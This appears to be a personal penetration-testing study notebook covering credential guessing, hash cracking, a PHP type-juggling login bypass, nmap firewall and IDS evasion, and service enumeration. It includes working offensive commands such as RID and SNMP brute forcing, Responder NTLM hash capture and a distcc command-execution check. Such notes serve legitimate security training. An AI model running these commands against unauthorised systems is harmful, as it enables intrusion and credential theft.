# Authentication

## General process

1. **Initial guesses**: 
   - Empty authentication (Anonymous login)
   - Default authentication: 
     - Google: *service + default credentials*
     - Web:
       - admin
       - user
     - Linux:
       - root (linux), 
     - Windows:
       - Guest
       - Administrator
   - Password: (*password*, same as username)
   - Password reuse on other services
2. **Password Spraying:**

   - Generate passwords with `pswgen`
3. **Brute Forcing**

   - zip files: johnthe ripper, use zip2john to convert it
     - `zip2john backup.zip > backup.hash`
     - `john backup.hash`

**Cracking:** `hashid` ->  [crackstation](https://crackstation.net/)

## Web

### Type Juggling

PHP type juggling vulnerability occurs when a loose comparison operator  (== or!=) is used in the place of a strict comparison operator (===  or!==) in a situation where the attacker has access to one of the  variables being compared. 

This vulnerability may cause the application to provide an unexpected  true or false response and may result in serious authorization and/or  authentication problems. 

![image-20241021201733300](/home/damuna/.config/Typora/typora-user-images/image-20241021201733300.png)

E.g. the following php code handling an authentication is vulnerable:

```php
if (strcmp($username , $_POST['username']) == 0) {
	if (strcmp($password, $_POST['password']) == 0) {
```

To exploit it, one can change the POST data of the web request using BurpSuit in an empty array, since If we convert those variables into empty arrays ( `$username[] & $password[] `), the comparison will return NULL , and NULL == 0 will return true, causing the login to be successful.

## Hash

Note that sometimes the credentials could be encrypted, in this case use `hashid` from the terminal to find out which kind of encryption is, and then use [crackstation](https://crackstation.net/) to try to crack it. 

### Shadow Hash

A shadow hash is the encrypted password of a local host. To crack it, we need the file /etc/passwd, which contains only the users with a local account.

# Enumeration

## nmap

Locate and list servers, services connected to the ntework.

### nmap: Host Discovery

Given one or more IP addresses, we want to see which ones are alive. To do this, we can use ICMP echo requests, and see which ones provide an ICMP reply to this. 

**nmap options:**

```bash
$ sudo nmap [IP] -sn | grep for | cut -d" " -f5
```

This scanning method works only if the firewalls of the hosts allow it.

- IP format:

  - range  `nmap [IP_start/IP_end]`

  - host list: `nmap -iL FILE`
  - multiple ips [IP1] [IP2] ...

- **`-sn`**: perform a "ping scan"  without performing a full port scan. 

- **`-d" "`**: Specifies a space as the delimiter.

- **`-f5`**: Tells `cut` to output the fifth field (word) from each line.

- `-PE`:  Perform only *ICMP* ping scan. 

- `--reason` Displays why an host is alive

- `--packet-trace` Shows all packages sent and received

### nmap: Service scanning

The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defined otherwise and is also one of the most popular  scan methods. This scan method makes it possible to scan several  thousand ports per second. The TCP-SYN scan sends one packet with the  SYN flag and, therefore, never completes the three-way handshake, which  results in not establishing a full TCP connection to the scanned port.

- If our target sends a `SYN-ACK` flagged packet back to us, Nmap detects that the port is `open`.
- If the target responds with an `RST` flagged packet, it is an indicator that the port is `closed`.
- If Nmap does not receive a packet back, it will display it as `filtered`. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.

#### **nmap options:**

- `-sC` parameter to specify that `Nmap` scripts should be used to try and obtain more detailed information. Also runs some default scripts
- `-sV` show the versions (banner grabbing)
- `-p-` all ports
- `--disable-arp-ping`: Disables ARP requests, so the scan doesn't switch to ARP requests when scanning local networks.
- `-Pn` disable the ICMP echo requests 
- `-n` disable DNS resolution
- `-A` aggressive scan
- `--packet-trace` Shows all packages sent and received
- `--version-trace` Show all version packages
- `--version-all` (Try every single probe to determine the version)          
- **protocols:**
  - `-sU` performs UDP scan
  - `-sS` SYN Scan: default
  - `-sT` Connect scan: sends a  `SYN` packet -> the port is open if it answers with  `SYN-ACK` packet and closed with an `RST` packet. 
    - Less stealthy and slow than `-sS`, but highly accurate.
    - Useful when the target has a firewall that drops incoming packets but allows outgoing packets. 

  - `-sA` ACK scan: much harder to filter for firewalls and IDS/IPS systems because they only send a TCP packet with only the ACK flag. 

  - `-O`: Performs operation system detection scan.
- **Firewall / IDS usuful flags:**
  
  - change protocol
  - `-D RND:5` Generates five random IP addresses that indicates the source IP the connection comes from.
  - `-S` Scans the target by using different source IP address.
  - `-e [INTERFACE]` Sends all requests through the specified interface.
  - `--dns-server <ns>,<ns>`) to specify DNS servers. 
  - `--source-port 53` specify a source port  for our scans. 
  - `-T` specifies the timeing (`0` paranoid - `5` insane)
  
- `nmap --script <script name> -p <port> <host>` to run other scripts.

  `--script "dns-* and discovery and not intrusive"`: this uses all the dns related scripts in the category discovery and not in the category intrusive. Here all the categories:

  - `auth` Determination of authentication credentials.
  - `broadcast` Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
  - `brute` Executes scripts that try to log in to the respective service by brute-forcing with credentials.
  - `default` Default scripts executed by using the -sC option.
  - `discovery` Evaluation of accessible services.
  - `dos` These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
  - `exploit` This category of scripts tries to exploit known vulnerabilities for the scanned port.
  - `external` Scripts that use external services for further processing.
  - `fuzzer` This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
  - `intrusive` Intrusive scripts that could negatively affect the target system.
  - `malware` Checks if some malware infects the target system.
  - `safe` Defensive scripts that do not perform intrusive and destructive access.
  - `version` Extension for service detection.
  - `vuln` Identification of specific vulnerabilities.



#### **nmap output**

- **`open`:** Connection to the scanned port has been established. These connections can be **TCP connections**, **UDP datagrams** as well as **SCTP associations**.
  
  - If the UDP port is `open`, we only get a response if the application is configured to do so.
  
- **`closed`:** 
  - The TCP protocol indicates that the packet we received back contains an `RST` flag. 
  - In the UDP scan, if we get an ICMP response with `error code 3` (port unreachable), we know that the port is indeed closed.
  
- **`filtered`:** Nmap cannot correctly identify whether the scanned port is open or  closed because:
  - the package was *dropped*: Nmap receives no response, and by default will resend the request, by setting the retry rate (`--max-retries`) to 10. 
  - A *firewall* reject the package: As a response, we could get one of the following error messages:
    - Net Unreachable
    - Net Prohibited
    - Host Unreachable
    - Host Prohibited
    - Port Unreachable
    - Proto Unreachable
  
- **`unfiltered`:** Nmap cannot correctly identify whether the scanned port is open or  closed because either *no response is returned* from the target for the  port or we get *an error code* from the target.

- **`open|filtered`:** If we do not get a response for a specific port, `Nmap` will set it to that state. This indicates that a firewall or packet filter may protect the port.
  - In UDP scan if the ICMP response was neither open nor closed, it will be marked as `open|filtered.

- **`closed|filtered`:** This state only occurs in the **IP ID idle** scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.

- **`tcpwrapped`** it means that the behavior of the port is consistent with one that is  protected by tcpwrapper. Specifically, it means that a full TCP  handshake was completed, but the remote host closed the connection  without receiving any data. 

  tcpwrapper protects *programs*, not ports. This means that a valid (not false-positive) `tcpwrapped` response indicates a real network service is available, but you are not on the list of hosts allowed to talk with it. When such a large number  of ports are shown as `tcpwrapped`, it is unlikely that they represent real services, so the behavior probably means something else.

**Firewalls and IDS/IPS**

Like the firewall, the intrusion detection system (`IDS`) and intrusion prevention system (`IPS`) are also software-based components. `IDS` scans the network for potential attacks, analyzes them, and reports any detected attacks. `IPS` complements `IDS` by taking specific defensive measures if a potential attack should have been detected, such as blocking the attacker's IP. Thus, from an attacker perspective, firewalls and IDS can be treated in the same way.

Here some way to deal with them:

- Change scanning protocol

- Change rate limit and intensity. If this isn't improving the results, then it means that it is a firewall and not a IPS, with `-T` and `--version-all`.

- Decoys:
  With the option `-D`,  Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent, e.g. `-D RND:5` it sends 5 random ones.

- IP ID manipulation: 

  There could be situations where only certain **subnets** are restricted from accessing specific services on a server. 

  In these cases, you might want to **manually specify a different source IP address** (using the `-S` and  `-e [interface (e.g. tun0)]` options ) from the ones in `ifconfig` to see if a different IP address (perhaps from a different subnet) gets better results.

- DNS Proxying

  - `--dns-server <ns>` to specify DNS servers, e.g. `1.1.1.1`. This method could be fundamental if we are in a demilitarized zone (`DMZ`). The company's DNS servers are usually more trusted than those from the  Internet. 

  - `--source-port 53` specifies the source port. If the administrator uses the firewall to control this  port and does not filter IDS/IPS properly, our TCP packets will be  trusted and passed through.

- If the firewall accepts `TCP port 53`, it is very likely that IDS/IPS filters might also be configured much  weaker than others. We can test this by trying to connect to this port  by using `Netcat`.

## Fingerprinting

Get as much information about server and network

- **Banner grabbing** is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner  once a connection is initiated.

  - `-sV` and `--version-all` it is usually enough

  - `nmap -sV --script=banner <target>` 

  - manually: connect to the SMTP server using `nc`, grab the banner, and intercept the network traffic using `tcpdump`

    ```bash
    sudo tcpdump -i [eth0/tun0] host [YOUR_IP] and [IP_TO_LISTEN]
    ```

    ```bash
    sudo ncat -v [IP] [PORT] {--source-port }
    ```

    add `--udp` if the port you want to connect to with netcat is upd.
    Note that if netcat times out, then you should just try more times.

- **SNMP (Simple Network Management Protocol) :** string that provide information and statistics about a router or device

  - v1, v2:  everything is send in the clear
  - v3: security measure, encryption and authentication
  - [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

## Services

**Services:**

- Authentication protocols (ssh, telnet, rdp, smb, vnc) → Find the credentials
- Read/Write (redis, ftp, tftp, smb, nfs, rsync, snmp, rpc, netbios, ldap)
- Database (redis, mysql, mssql, psql, mongodb, oracle-tns, whois)
- Network Access (squid, isakmp, irc, dns)
- E-mail (smtp, pop3, imap)

**Stacks (common ports)**

- 135, 139, 445 -> SMB
- 80, 8080, 8000, 8443, 3000 -> HTTP
- 88, 389, 5985 -> Active Directory
- 21, 2121 -> FTP
- 22, 2222 -> SSH
- 1433, 3306, 5432, 27017 -> DB: MsSQLS, MySQL, PSQL, Mongo

## nxc

Generic tool to navigate all the authentication protocols. The guide: https://www.netexec.wiki/

`nxc [PROTOCOL] [TARGET] -u [USERNAME] -p [PASSWORD] --port [PORT] [OPTIONS]`

To do *password spraying*, you can put a file instead of the username, with the most common ones.

Possible protocols:

	- ftp
	- smb
	- ssh
	- vnc
	- rdp
	- winrm
	- msSQL

# Network

## Service Hacking

### DNS T53

#### Generalities:

- Purpose:

  - DNS servers translate domain names into IP addresses and thus control which server a user can reach via a  particular domain. 
  - It stores and outputs additional information about the services associated with a domain.

- Encryption:

  DNS is mainly unencrypted. Devices on the local WLAN and Internet  providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By  default, IT security professionals apply `DNS over TLS` (`DoT`) or `DNS over HTTPS` (`DoH`) here. In addition, the network protocol `DNSCrypt` also encrypts the traffic between the computer and the name server.

- Types of DNS Servers:

  - *DNS root server*

    responsible for the top-level domains (`TLD`). As the last instance, they are only requested if the name server does not respond. 

  - *Authoritative name server*

    hold authority for a particular zone. They only answer queries from their area of responsibility,

  - *Non-authoritative name server*

     they collect information on specific DNS zones

  - *Caching server*

    cache information from other name servers for a specified period. The  authoritative name server determines the duration of this storage.

  - *Forwarding server*

    forward DNS queries to another DNS server.

  - *Resolver*

    perform name resolution locally

- DNS records:

  - `A`  Returns an IPv4 address of the requested domain 
  - `AAAA`  Returns an IPv6 address of the requested domain.
  - `MX`  Returns the responsible mail servers 
  - `NS`  Returns the DNS servers (nameservers) of the domain.
  - `TXT`  Contains various information
  - `CNAME`  Serves as an alias for another domain name.
  - `PTR`  Converts IP addresses into valid domain names.
  - `SOA`  Provides information about the corresponding DNS zone and email address of the administrative contact.


**Configuration**

- *Local DNS configurations files*
  - [Bind9](https://www.isc.org/bind/) is often used on Linux
  - Different zones are defined here
  - The local conf files are usually:
    - `named.conf.local`
    - `named.conf.options`
    - `named.conf.log`
  - Dangerous settings:
    - `allow-query`  Defines which hosts are allowed to send requests to the DNS server.
    - `allow-recursion`  Defines which hosts are allowed to send recursive requests to the DNS server.
    - `allow-trnasfer`  Defines which hosts are allowed to receive zone transfers from the DNS server.
    - `zone-statistics`  Collects statistical data of zones.
  
- *zone files* `/etc/bind/db.domain.com`

  Text file that describes a DNS zone with the BIND file format. 

   There must be precisely one `SOA` record (usually at the beginning) and at least one `NS` record. 

- *reverse name resolution files* `/etc/bind/db.10.129.14`

  The computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a `PTR` record., which are responsible for the reverse translation of IP addresses into names.

#### Footprinting

- Name Servers:

  ```bash
  dig ns [NAME_SERVER] @[DNS SERVER] {+short}
  ```

- Version:

  ```bash
  dig CH TXT version.bind [DNS SERVER]
  ```

- View all available records

  ```bash
  dig ANY [NAME_SERVER] @[DNS SERVER]
  ```

- Zone Transfer

  Transfer of zones to another server in DNS, This procedure is abbreviated `Asynchronous Full Transfer Zone` (`AXFR`)

   DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master  is called a slave. The slave fetches the `SOA` record of the relevant zone from  the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA  record of the master is greater than that of the slave, the data sets no longer match.

  ```
  dig axfr [NAME_SERVER] @[DNS SERVER]
  ```

  If the administrator used a subnet for the `allow-transfer` option or set it to `any`, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames.

  ```
  dig axfr [ZONE].[NAME_SERVER] @[DNS SERVER]
  ```

  The individual `A` records with the hostnames can also be found out with the help of a brute-force attack:

  - If the Zone transfer fails, it means that you don't have access to those subdomain, thus you can do *SubDomain Brute Forcing* [DNSenum](https://github.com/fwaeytens/dnsenum)


  ```bash
  dnsenum --dnsserver [DNS_SERVER] --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt [DOMAIN]
  ```


### FTP T21

#### Generalities:

**Type:** 

Authentication, Read/Write

- Protocol:

  In an FTP connection, two channels are opened. First, the client and server establish a control channel through `TCP port 21`. The client sends commands to the server, and the server returns status  codes. Then both communication participants can establish the data  channel via `TCP port 20`. This channel is used exclusively  for data transmission, and the protocol watches for errors during this  process. If a connection is broken off during transmission, the  transport can be resumed after re-established contact.

- Active vs Passive mode:

  A distinction is made between `active` and `passive` FTP. In the active variant, the client establishes the connection as  described via TCP port 21 and thus informs the server via which  client-side port the server can transmit its responses. However, if a  firewall protects the client, the server cannot reply because all  external connections are blocked. For this purpose, the `passive mode` has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the  connection in this method, the firewall does not block the transfer.

- [List of FTP return codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)

#### Interaction:

- `ftp`

  - `cd`, `ls`, to navigate
  - `get` `put` to download/upload
  - `status` to check the settings
  - `LIST -R`, if the setting ls_recurse_enable=YES, this show all the content at once.
  - `debug`
  - `trace`

- Download all available files:

  ```bash
  wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
  ```

- If TLS/SSl wncryption is present:

  ```bash
  openssl s_client -connect [IP] -starttls ftp
  ```

  This will also show the SSL certificate

- netcat/telnet

#### Exploit:

- Anonymous login: anonymous:anonymous

- File upload
  - LFI
  - with web servers, it is common that files are synchronized

- sniffing with tcpdump could be possible
- If the user are shown (i.e. the setting `hide_ids`, which makes all user and group information in directory listings will be displayed as "ftp", is set on NO)

**vsFTPd Configuration**

- The default configuration of vsFTPd can be found in `/etc/vsftpd.conf`
- Possible settings: [man page](http://vsftpd.beasts.org/vsftpd_conf.html).
- `/etc/ftpusers` is used to deny certain users access to the FTP service.

### IMAP T143, T993

#### Generalities:

**Type:** mail

- Purpose:
  - Access emails from a mail server
  - Allows online management on the server (supports folders)
  - Authentication to the desire mailbox
  - No-encryption: transmits commands, emails, or usernames and passwords in plain text.
  - SSL/TLS to require an encrypted session (on the higher port if present)

#### Configuration

In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.

**Dangerous Settings:**

| **Setting**               | **Description**                                              |
| ------------------------- | ------------------------------------------------------------ |
| `auth_debug`              | Enables all authentication debug logging.                    |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons. |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated. |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |

#### Interaction

- nmap will return the available commands that can be executed

- If we discover the credentials:

  ```bash
  curl -k 'imaps://[IP]' --user user:password -v
  ```

  -  `verbose` (`-v`) we can see the version of TLS used for  encryption, further details of the SSL certificate, and even the banner, which could contain the version of the mail server.

- To connect via openssl (also `netcat` is possible):

  ```bash
  openssl s_client -connect [IP]:imaps
  ```

| **Command**                     | **Description**                                              |
| ------------------------------- | ------------------------------------------------------------ |
| `1 LOGIN username password`     | User's login.                                                |
| `1 LIST "" *`                   | Lists all directories.                                       |
| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                     |
| `1 DELETE "INBOX"`              | Deletes a mailbox.                                           |
| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                           |
| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
| `1 SELECT INBOX`                | Selects a mailbox so that messages in the mailbox can be accessed. |
| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                  |
| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox.     |
| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.            |
| `1 LOGOUT`                      | Closes the connection with the IMAP server.                  |

### NFS TU111, TU2049

#### Generalities:

**Type:** Reade/Write, Authentication only for v4

- Purpose:

  Access file systems over a network as if they were local and is used between Linux and Unix systems.

- Version 4 vs the previous:

  In version 3 of NFS, only the client computer (i.e., the machine trying to connect to the NFS server) needs to be authenticated. Once the client is authenticated, any user on that client machine has access based on the client’s access permissions, without further authentication. In version 4, NFS, individual users are authenticated rather than just the client machine. Also, only one UDP or TCP port `2049` is used to run the service, which simplifies the use of the protocol across firewalls.

- Protocol:

  NFS is based on the [Open Network Computing Remote Procedure Call](https://en.wikipedia.org/wiki/Sun_RPC) (`ONC-RPC`/`SUN-RPC`) protocol exposed on `TCP` and `UDP` ports `111`, which uses [External Data Representation](https://en.wikipedia.org/wiki/External_Data_Representation) (`XDR`) for the system-independent exchange of data. The NFS protocol has no mechanism for authentication or authorization. Instead, authentication is completely shifted to the RPC protocol's options. The most common authentication is via UNIX `UID`/`GID` and `group memberships`.

#### Configuration

- `/etc/exports`
  - The [NFS Exports Table](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html) shows the possible options of the file
  - First, the folder is specified and made available to others, and then  the rights they will have on this NFS share are connected to a host or a subnet.
  - Possible options:
    - `rw`  Read and write permissions. 
      - Dangerous
    - `ro`  Read only permissions.
    - `sync`  Synchronous data transfer. (A bit slower)
    - `async`  Asynchronous data transfer. (A bit faster)
    - `secure`  Ports above 1024 will not be used.
    - `insecure`  Ports above 1024 will be used. 
      - Dangerous: users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.
    - `no_subtree_check`  This option disables the checking of subdirectory trees.
    - `root_squash`  Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. 
      - Dangerous: if set, we cannot edit the `backup.sh` file even as root.
    - `nohide`  If another file system was mounted below an exported directory, this directory is exported by its own exports entry. 
      - Dangerous

#### Navigation

- Show available Shares that can be mouted

  ```bash
  showmount -e [IP]
  ```

- Mount a Share

  ```bash
  $ mkdir target-NFS
  $ sudo mount -t nfs [IP]:/ ./target-NFS/ -o nolock
  $ cd target-NFS
  $ tree .
  ```

- List Content with UIDs & GUIDs

  ```bash
  ls -n mnt/nfs/
  ```

- Unmount

  ```bash
  $ cd ..
  $ sudo umount ./target-NFS
  ```

  

#### Exploit:

- If we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUID` of that user and then run the shell via the SSH user.

### POP3 T110, T995

#### Generalities:

**Type:** mail

- Purpose:
  - Access emails from a mail server
  - Allows online listing retrieving and deleting emails
  - Authentication to the desire mailbox
  - SSL/TLS to require an encrypted session (on the higher port if present)

#### Configuration

In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.

**Dangerous Settings:**

| **Setting**               | **Description**                                              |
| ------------------------- | ------------------------------------------------------------ |
| `auth_debug`              | Enables all authentication debug logging.                    |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons. |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated. |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |

#### Interaction

- nmap will return the available commands that can be executed

- If we discover the credentials:

  ```bash
  curl -k 'pop3s://[IP]' --user user:password -v
  ```

  -  `verbose` (`-v`) we can see the version of TLS used for  encryption, further details of the SSL certificate, and even the banner, which could contain the version of the mail server.

- To connect via openssl:

  ```bash
  openssl s_client -connect [IP]:pop3s
  ```

| **Command**     | **Description**                                             |
| --------------- | ----------------------------------------------------------- |
| `USER username` | Identifies the user.                                        |
| `PASS password` | Authentication of the user using its password.              |
| `STAT`          | Requests the number of saved emails from the server.        |
| `LIST`          | Requests from the server the number and size of all emails. |
| `RETR id`       | Requests the server to deliver the requested email by ID.   |
| `DELE id`       | Requests the server to delete the requested email by ID.    |
| `CAPA`          | Requests the server to display the server capabilities.     |
| `RSET`          | Requests the server to reset the transmitted information.   |
| `QUIT`          | Closes the connection with the POP3 server.                 |

​                          

### SMB T137-9/T445

#### Generalities:

**Type:** Read/Write, Authentication

- Purpose:

  - regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. 
- Information exchange between different system processes 


  - The client can communicate with other  participants in the same network to access files or services shared with it on the network

  - provide arbitrary parts of its local file system as shares.


- Workgroups:

  In a network, each host participates in the same `workgroup`. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network.

#### Footprinting

- nmap

- rpccclient

  ```bash
  rcpclient -U "user" [IP]
  ```

  - `srvinfo`  Server information.
  - `enumdomains`  Enumerate all domains that are deployed in the network.
  - `querydominfo`  Provides domain, server, and user information of deployed domains.
  - `netshareenumall`  Enumerates all available shares.
  - `netsharegetinfo <share>`  Provides information about a specific share.
  - `enumdomusers`  Enumerates all domain users.
  - `queryuser <RID>`  Provides information about a specific user.

  

  The query `queryuser <RID>` is mostly allowed based on the RID. So we can use the rpcclient to brute force the RIDs to get information. Because we may not know who has been assigned which RID, we know that  we will get information about it as soon as we query an assigned RID:

  ```bash
  for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
  ```

  - `seq 500 1100` generates a sequence of numbers from 500 to 1100
  - `-c "queryuser 0x$(printf '%x\n' $i)"`: Executes the `queryuser` command to query information about a user by their RID (Relative Identifier)

-  [SMBMap](https://github.com/ShawnDEvans/smbmap)

- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

#### Navigation:

- `smbclient -N -L //[IP ADDRESS]{/FOLDER}`
  
  - `-N` anonymous access
  - `-L` display the list of shares (only to display without access!!)
  
    The ones accessible without authentication don't have the dollar sign `$`
- `cd`, `ls`, and to download a file `get`.
- `!<cmd>` to execute local system commands without interrupting the connection
- `smbstatus` shows the version and who, from which host, and which share the client is connected
- `psexec` to open a shell

**Exploit**

- Anonymous Login
- EternalBlue: anything that uses SMBv1 is at risk

**Configuration**

- `/etc/samba/smb.conf` to change settings
- Dangerous settings:
  - `browseable - yes`: Allow listing available shares in the current share

### SNMP U161

#### Generalities:

**Type:** Database

- Purpose:
  - monitor network devices
  - handle configuration tasks and change settings remotely
  - SNMP-enabled hardware includes routers, switches, servers, IoT devices...
  - Sends traps over UDP port 162: data packets sent from the SNMP server to the client without  being explicitly requested. If a device is configured accordingly, an  SNMP trap is sent to the client once a specific event occurs on the  server-side. For the SNMP client and server to exchange the respective values, the  available SNMP objects must have unique addresses known on both sides. 
- MIB
  - Text file in which all queryable SNMP objects of a device are listed as a tree
  - It contains at least one `Object Identifier` (`OID`) (a node in the tree, uniquely identified by a sequence of numbers), which, in addition to the necessary unique address and a name, also  provides information about the type, access rights, and a description of the respective object.
- Authentication and Encryption
  - Only in version 3 we have encryption and authentication via user:pass
  - Community strings: in v2, determine whether the requested information can be viewed or not, thus can be seen as passwords

#### Configuration

- Daemon

  - All the settings in the [manpage](http://www.net-snmp.org/docs/man/snmpd.conf.html).

  - `cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'`

  - Dangerous Settings:

  - | **Settings**                                     | **Description**                                              |
    | ------------------------------------------------ | ------------------------------------------------------------ |
    | `rwuser noauth`                                  | Provides access to the full OID tree without authentication. |
    | `rwcommunity <community string> <IPv4 address>`  | Provides access to the full OID tree regardless of where the requests were sent from. |
    | `rwcommunity6 <community string> <IPv6 address>` | Same access as with `rwcommunity` with the difference of using IPv6. |

#### Interaction

1. Query the OIDs with their information

   ```bash
   snmpwalk -v2c -c public [IP]
   ```

2. Brute-force community strings (if version 1,2)

   ```bash
   onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt [IP]
   ```

    [crunch](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create custom wordlists

3. Brute-force OIDs after a community string is knows

   ```bash
   braa <community string>@<IP>:.1.3.6.*
   ```

   Remember to try also the community string `public`



### SMTP T25 v T587

#### Generalities:

**Type: ** Email

- Purpose:

  - Sends emails in an IP network, often combined with the IMAP or POP3 protocols, which can fetch emails and send emails.
  - Prevents spam using authentication mechanisms that allow only authorized users to send e-mails.

- Used with SSL/TLS encryption.

- Protocol:

  ![image-20241104144603042](/home/damuna/.config/Typora/typora-user-images/image-20241104144603042.png)

  1.  Authentication
  2.  After sending his e-mail, the SMTP client, disassembles it into a header and a body and uploads both to the SMTP server.
  3. Sometimes there is a *Mail Submission Agent* (`MSA`), or *Relay Server*, which checks the validity, i.e., the origin of the e-mail. 
  4. The *Mail Transfer Agent* (`MTA`), the software basis for sending and receiving e-mails, checks the e-mail for size and spam and then stores it. 
  5. Email is reassembled.
  6. The *Mail Delivery Agent* (`MDA`) transfers it to the recipient's mailbox.

- Downsides:

  - No usable delivery confirmation: only an English-language error message, including the header of the undelivered message, is returned.

  - Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable. 

    As a result, open SMTP relays are often misused to send spam en masse. The originators use arbitrary fake sender addresses for this purpose to not be traced (mail spoofing). 

  - For this purpose, an extension for SMTP has been developed called `Extended SMTP` (`ESMTP`). When people talk about SMTP in general, they usually mean ESMTP.

#### Configuration

- `/etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"`

- Dangereous settings:

  - Open Relay Configuration

    `mynetworks = 0.0.0.0/0`

    With this setting, this SMTP server can send fake emails and thus  initialize communication between multiple parties. Another attack  possibility would be to spoof the email and read it.

#### Interaction

- `telnet` list of response code [here](https://serversmtp.com/smtp-error/)
  - `AUTH PLAIN`  authenticate the client.
  - `HELO`  logs in with its computer name and thus starts the session.
  - `MAIL FROM`  names the email sender.
  - `RCPT TO`  names the email recipient.
  - `DATA`  initiates the transmission of the email.
  - `RSET`  aborts the initiated transmission but keeps the connection between client and server.
  - `VRFY`  checks if a mailbox is available for message transfer, can enumerate existing users on the system
  - `EXPN`  checks if a mailbox is available for messaging with this command.
  - `NOOP`  equests a response from the server to prevent disconnection due to time-out.
  - `QUIT`  terminates the session.

- ```bash
  telnet <ip> <port>
  # Basic interactions
  HELO <domain>
  EHLO <domain>
  VRFY root
  VRFY testuser
  # Sometimes we may have to work through a web proxy. 
  CONNECT <ip>:<port> HTTP/1.0
  # Send an email
  MAIL FROM: <[USER]@[DOMAIN]>
  RCPT TO: <[USER]@[DOMAIN]> NOTIFY=success,failure
  DATA
  ```

#### Footprinting

```bash
smtp-user-enum -M <method VRFY, EXPN, RCPT > -u <WORDLISRT> -t <ip> -D dom
```

To try with domain usually only for RCPT.

### RDP 3389

`xfreerdp` 

### WINRM 5985

You can authenticate either with the password or with NTLM, which is a collection of authentication protocols transmitted in shared folders (like active directories). It is a single-sign-on (SSO), since you put the password only once, at login.

The password is stored as an hash,  one-way function that takes any amount of data and returns a fixed size value.

Use responder to attack it: 

```
sudo responder -I tun0 -w -d 
```

it creates a fake shared folder in your network, that if it interacts with the attacked ip (e.g. through the parameter of a web page), will steal the password as an Hash.

The responder IP has to be loaded as a shared folder, i.e. `//<IP>/somefile`, if we want to do RFI.

HASH Cracking

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

### MySQL

**Type:** Database

 `mysql -h {IP} -u root`

### REDIS

**Type:** Database

 `redis-cli -h [ip]`

Once inside redis environment `info` return information about the  server

- `Server` info: get version of redis
- `Keyspace` list of dictionaries (dictionaries) with statistics: number of keys, number of keys with expiration
- `select {index number of the database}`
- `keys *` List all the keys in the database
- `get {key}`

### msSQL 1433

-  `mssqlclient.py [[domain/]username[:password]@]<targetName or address> -windows-auth`

### RSyinc

- To read: `rsync -av --list-only rsync://{HOST}/`

- To copy: `rsync -av rsync://{HOST}/{module} [YOUR DIRECTORY]`

### 3632 distccd

**Distcc** is a tool that enhances the **compilation process** by utilizing the **idle processing power** of other computers in the network. When **distcc** is set up on a machine, this machine is capable of distributing its **compilation tasks** to another system. This recipient system must be running the **distccd daemon** and must have a **compatible compiler** installed to process the sent code.

Check if it's vulnerable to **CVE-2004-2687** to execute arbitrary code:

```bash
nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
```

### TFTP UPD 69

**Type: ** Read/write

Like FTP, but without needing authentication.

```
tftp
>
```

| **Commands** | **Description**                                              |
| ------------ | ------------------------------------------------------------ |
| `connect`    | Sets the remote host, and optionally the port, for file transfers. |
